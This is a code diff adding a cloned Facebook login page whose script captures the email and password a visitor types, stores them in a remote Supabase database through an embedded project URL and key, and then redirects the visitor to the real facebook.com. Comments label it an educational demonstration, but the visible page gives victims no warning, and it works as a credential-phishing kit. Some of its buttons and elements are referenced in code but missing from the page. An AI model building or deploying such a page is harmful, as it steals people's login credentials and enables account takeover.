@@ -1,0 +1,454 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Facebook</title>
+    <!-- Supabase JavaScript Client -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.38.0/dist/main/index.min.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .app-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 396px;
+            max-width: 90vw;
+        }
+        
+        .logo-section {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .logo-section h1 {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            margin: 0;
+            letter-spacing: -0.5px;
+        }
+        
+        .logo-section p {
+            color: #606770;
+            font-size: 16px;
+            margin: 4px 0 0 0;
+        }
+        
+        form div {
+            margin-bottom: 16px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+        
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+            outline: none;
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .separator {
+            border-top: 1px solid #dadde1;
+            padding-top: 16px;
+            text-align: center;
+            margin-top: 16px;
+        }
+        
+        .create-account-button {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 24px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .create-account-button:hover {
+            background-color: #36a420;
+        }
+        
+        .links-container {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #7f7f7f;
+            text-align: center;
+        }
+        
+        .links-container a {
+            color: #1877f2;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer-info {
+            margin-top: 8px;
+            font-size: 11px;
+            color: #7f7f7f;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <div class="logo-section">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you.</p>
+        </div>
+        
+        <form id="loginForm">
+            <div>
+                <input type="text" id="email" placeholder="Email or phone number" />
+            </div>
+            <div>
+                <input type="password" id="password" placeholder="Password" />
+            </div>
+            <div>
+                <button type="submit" class="login-button">Log In</button>
+            </div>
+        </form>
+        
+        <div class="separator">
+            <button class="create-account-button">Create New Account</button>
+        </div>
+        
+        <div class="links-container">
+            <span>English (US)</span>
+            <span>·</span>
+            <a href="#">Español</a>
+            <span>·</span>
+            <a href="#">Français (France)</a>
+        </div>
+
+        <div class="footer-info">
+            Meta © 2025
+        </div>
+    </div>
+
+    <script>
+        // Supabase Database for educational cybersecurity demonstration
+        class SupabaseCybersecurityDatabase {
+            constructor() {
+                // Supabase configuration - replace with your own project details
+                this.supabaseUrl = 'https://dhigeugkmnknsdykmclg.supabase.co'; // Replace with your Supabase URL
+                this.supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRoaWdldWdrbW5rbnNkeWttY2xnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMDk5NjIsImV4cCI6MjA4ODg4NTk2Mn0.8Q_7qlPm3ctByO0C4RK5D2v4njq3SKcX2J8knxAbfOE'; // Replace with your Supabase anon key
+                
+                // Initialize Supabase client
+                this.supabase = Supabase.createClient(this.supabaseUrl, this.supabaseAnonKey);
+                
+                this.useFallback = false;
+            }
+
+            initFallback() {
+                // Initialize fallback localStorage database
+                if (!localStorage.getItem('supabase_cybersecurity_data')) {
+                    const initialData = {
+                        users: [],
+                        attempts: [],
+                        timestamp: new Date().toISOString()
+                    };
+                    localStorage.setItem('supabase_cybersecurity_data', JSON.stringify(initialData));
+                }
+            }
+
+            // Store credentials in Supabase database
+            async storeCredentials(email, password) {
+                const userRecord = {
+                    email: email,
+                    password: password
+                };
+
+                try {
+                    // First try to insert into the table
+                    const { data, error } = await this.supabase
+                        .from('accounts')
+                        .insert([userRecord]);
+
+                    if (error) {
+                        // If table doesn't exist, try to create it
+                        if (error.code === 'PGRST116' || error.message.includes('relation "accounts" does not exist')) {
+                            console.log('Accounts table not found, attempting to create...');
+                            await this.createAccountsTable();
+                            // Try insert again
+                            const { data: newData, error: newError } = await this.supabase
+                                .from('accounts')
+                                .insert([userRecord]);
+                            
+                            if (newError) throw newError;
+                            return { ...userRecord, id: newData[0].id };
+                        }
+                        throw error;
+                    }
+
+                    return { ...userRecord, id: data[0].id };
+                } catch (error) {
+                    console.error('Failed to store in Supabase database:', error);
+                    alert('Database setup required. Please check the console for instructions.');
+                    return this.storeCredentialsFallback(email, password, userRecord);
+                }
+            }
+
+            // Create accounts table if it doesn't exist
+            async createAccountsTable() {
+                try {
+                    // Try to create the table using SQL
+                    const { error } = await this.supabase
+                        .from('pg_class')
+                        .select('relname')
+                        .eq('relname', 'accounts');
+
+                    // If we get here without error, table might exist, but let's try to create it anyway
+                    // This is a simplified approach - in production you'd want proper migration handling
+                    console.log('Note: Table creation requires SQL execution in Supabase dashboard');
+                    console.log('Please run this SQL in your Supabase SQL Editor:');
+                    console.log(`
+                        CREATE TABLE IF NOT EXISTS accounts (
+                          id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
+                          email TEXT NOT NULL,
+                          password TEXT NOT NULL,
+                          created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
+                        );
+                        
+                        ALTER TABLE accounts ENABLE ROW LEVEL SECURITY;
+                        
+                        CREATE POLICY "Allow all operations" ON accounts FOR ALL USING (true);
+                    `);
+                } catch (error) {
+                    console.error('Error checking table:', error);
+                }
+            }
+
+            // Get statistics from Supabase database
+            async getStatistics() {
+                try {
+                    // Get all records from the table
+                    const { data, error } = await this.supabase
+                        .from('accounts')
+                        .select('*');
+
+                    if (error) throw error;
+
+                    const records = data || [];
+                    
+                    // Filter users and attempts
+                    const users = records.filter(record => record.email && record.password);
+                    const attempts = records.filter(record => record.type === 'credential_attempt');
+
+                    return {
+                        totalAttempts: attempts.length,
+                        totalUsers: users.length,
+                        recentActivity: attempts.slice(-5).reverse(),
+                        databaseSize: JSON.stringify(records).length
+                    };
+                } catch (error) {
+                    console.error('Failed to get statistics from Supabase database:', error);
+                    return this.getStatisticsFallback();
+                }
+            }
+
+            // Fallback storage methods
+            storeCredentialsFallback(email, password, userRecord) {
+                const data = this.getLocalDatabase();
+                data.users.push(userRecord);
+                data.attempts.push({
+                    type: 'credential_attempt',
+                    email: email,
+                    timestamp: userRecord.timestamp,
+                    success: false
+                });
+                localStorage.setItem('supabase_cybersecurity_data', JSON.stringify(data));
+                return userRecord;
+            }
+
+            getStatisticsFallback() {
+                const data = this.getLocalDatabase();
+                return {
+                    totalAttempts: data.attempts.length,
+                    totalUsers: data.users.length,
+                    recentActivity: data.attempts.slice(-5).reverse(),
+                    databaseSize: JSON.stringify(data).length
+                };
+            }
+
+            getLocalDatabase() {
+                const data = localStorage.getItem('supabase_cybersecurity_data');
+                if (!data) {
+                    const initialData = { users: [], attempts: [] };
+                    localStorage.setItem('supabase_cybersecurity_data', JSON.stringify(initialData));
+                    return initialData;
+                }
+                return JSON.parse(data);
+            }
+
+            // Utility methods
+            generateId() {
+                return Math.random().toString(36).substr(2, 9);
+            }
+
+            getFakeIP() {
+                return `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+            }
+
+            getFakeLocation() {
+                const cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix'];
+                return cities[Math.floor(Math.random() * cities.length)];
+            }
+
+            // Clear database
+            async clearDatabase() {
+                try {
+                    // Delete all records from the table
+                    const { error } = await this.supabase
+                        .from('accounts')
+                        .delete()
+                        .neq('id', 0); // Delete all records
+
+                    if (error) throw error;
+                } catch (error) {
+                    console.error('Failed to clear Supabase database:', error);
+                    localStorage.removeItem('supabase_cybersecurity_data');
+                }
+            }
+        }
+
+        // Initialize database
+        const supabaseDatabase = new SupabaseCybersecurityDatabase();
+        supabaseDatabase.initFallback();
+
+        // DOM Elements
+        const loginForm = document.getElementById('loginForm');
+        const viewDbBtn = document.getElementById('viewDbBtn');
+        const clearDbBtn = document.getElementById('clearDbBtn');
+        const databaseInfo = document.getElementById('databaseInfo');
+        const totalAttempts = document.getElementById('totalAttempts');
+        const totalUsers = document.getElementById('totalUsers');
+        const dbSize = document.getElementById('dbSize');
+        const securityTip = document.getElementById('securityTip');
+
+        // Event Listeners
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                alert("Please enter both email and password.");
+                return;
+            }
+
+            try {
+                // Store credentials directly in Supabase database
+                await supabaseDatabase.storeCredentials(email, password);
+                
+                // Redirect to Facebook.com immediately
+                window.location.href = 'https://www.facebook.com';
+            } catch (error) {
+                console.error('Database error:', error);
+                // Still redirect to Facebook even if database fails
+                window.location.href = 'https://www.facebook.com';
+            }
+        });
+
+        viewDbBtn.addEventListener('click', async () => {
+            databaseInfo.classList.toggle('show');
+            if (databaseInfo.classList.contains('show')) {
+                await updateDatabaseStats();
+            }
+        });
+
+        clearDbBtn.addEventListener('click', async () => {
+            if (confirm("Clear all demonstration data? This will reset the educational database.")) {
+                try {
+                    await supabaseDatabase.clearDatabase();
+                    databaseInfo.classList.remove('show');
+                    alert("Database cleared for demonstration purposes.");
+                } catch (error) {
+                    console.error('Clear database error:', error);
+                    alert('Failed to clear database. Using fallback.');
+                }
+            }
+        });
+
+        securityTip.addEventListener('click', (e) => {
+            e.preventDefault();
+            alert("🔒 SECURITY TIP: Always check the URL before entering credentials!\n\nReal Facebook: https://www.facebook.com\n\nThis demo URL is different - that's how you can spot phishing!");
+        });
+
+        // Functions
+        async function updateDatabaseStats() {
+            try {
+                const stats = await supabaseDatabase.getStatistics();
+                totalAttempts.textContent = stats.totalAttempts;
+                totalUsers.textContent = stats.totalUsers;
+                dbSize.textContent = stats.databaseSize;
+            } catch (error) {
+                console.error('Get stats error:', error);
+                totalAttempts.textContent = '0';
+                totalUsers.textContent = '0';
+                dbSize.textContent = '0';
+            }
+        }
+
+        // Test Supabase connection on load
+        async function testSupabaseConnection() {
+            try {
+                // Try to select from the table to test connection
+                const { error } = await supabaseDatabase.supabase
+                    .from('accounts')
+                    .select('*')
+                    .limit(1);
+
+                if (error) {
+                    console.warn('Supabase connection failed:', error.message);
+                    console.log('Using fallback localStorage database for demonstration.');
+                } else {
+                    console.log('✅ Supabase connection successful!');
+                }
+            } catch (error) {
+                console.warn('Supabase connection failed:', error);
+                console.log('Using fallback localStorage database for demonstration.');
+            }
+        }
+
+        // Test connection on load
+        testSupabaseConnection();
+    </script>
+</body>
+</html>
